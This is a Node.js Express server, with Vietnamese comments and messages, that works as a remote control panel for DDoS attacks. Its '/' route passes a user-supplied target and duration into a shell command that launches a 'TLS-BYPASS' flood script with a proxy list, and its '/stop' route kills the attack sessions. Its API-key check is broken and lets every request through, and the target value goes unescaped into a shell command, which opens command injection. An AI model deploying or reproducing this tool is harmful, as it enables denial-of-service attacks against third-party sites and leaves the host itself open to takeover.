const express = require('express');
const { exec } = require('child_process');

const app = express();
const port = 3000;
const apiKey = '123123';

// Middleware xác thực yêu cầu sử dụng apikey
function authenticate(req, res, next) {
  const providedApiKey = req.headers['apikey'];

  if (!providedApiKey || providedApiKey !== apiKey) {
     res.status(200).send('Xác thực thành công');

  }
  // Xác thực thành công, gửi thông báo
  console.log('Xác thực thành công');
  res.setHeader('X-Authenticated', 'true');

  next();
}

app.use(express.json());

// Sử dụng middleware authenticate cho các route / và /stop
app.use(['/','/stop'], authenticate);

app.get('/', (req, res) => {
  const target = req.query.target || '';
  const time = req.query.time || '';

  if (target && time) {
    const command = `screen -S DDOS -dm node TLS-BYPASS ${target} ${time} 30 proxy.txt 30`;
    try {
      exec(command, (error, stdout, stderr) => {
        if (error) {
          res.status(500).send(`Lỗi khi tấn công mục tiêu ${target} trong ${time} giây`);
          return;
        }
        res.send(`Bắt đầu tấn công mục tiêu ${target} trong ${time} giây`);
      });
    } catch (err) {
      res.status(500).send('Lỗi khi thực thi lệnh');
    }
  } else {
    res.status(400).send('Thiếu tham số target hoặc time');
  }
});

app.get('/stop', (req, res) => {
  const stopCommand = `screen -ls | grep DDOS | cut -d. -f1 | awk '{print $1}' | xargs -I % screen -X -S % quit`;

  try {
    exec(stopCommand, (error, stdout, stderr) => {
      if (error) {
        res.status(500).send('Lỗi khi dừng các cuộc tấn công DDOS');
        return;
      }
      res.send('Đã dừng các cuộc tấn công DDOS thành công');
    });
  } catch (err) {
    res.status(500).send('Lỗi khi thực thi lệnh');
  }
});

app.listen(port, () => {
  console.log(`Server đang lắng nghe tại http://localhost:${port}`);
});
